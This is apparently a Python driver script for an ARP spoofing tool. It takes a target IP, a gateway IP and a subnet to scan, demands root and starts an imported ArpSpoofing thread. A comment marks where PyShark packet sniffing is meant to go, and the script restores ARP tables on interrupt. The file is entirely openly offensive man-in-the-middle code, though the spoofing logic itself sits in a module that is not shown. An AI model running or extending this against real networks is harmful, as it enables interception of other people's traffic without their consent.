from ArpSpoofing import ArpSpoofing
from DiscoverHosts import select_device
import argparse
import os
import sys

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target",
                        help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway",
                        help="Gateway IP")
    parser.add_argument("-s", "--scan", dest="scan",
                        help="Subnet mask for scanning hosts")
    options = parser.parse_args()
    return options

if (os.geteuid() != 0):
    print("Root privilege is needed to discover hosts using nmap.")
    sys.exit(1)

options = get_arguments()
target, gateway = select_device(options)

arp_spoofing = ArpSpoofing(target, gateway)
arp_spoofing.start()

# Do packet sniffing work in PyShark

try:
    while True:
        pass
except KeyboardInterrupt:
    arp_spoofing.restore_flag.set()
    arp_spoofing.join()
    sys.exit(0)
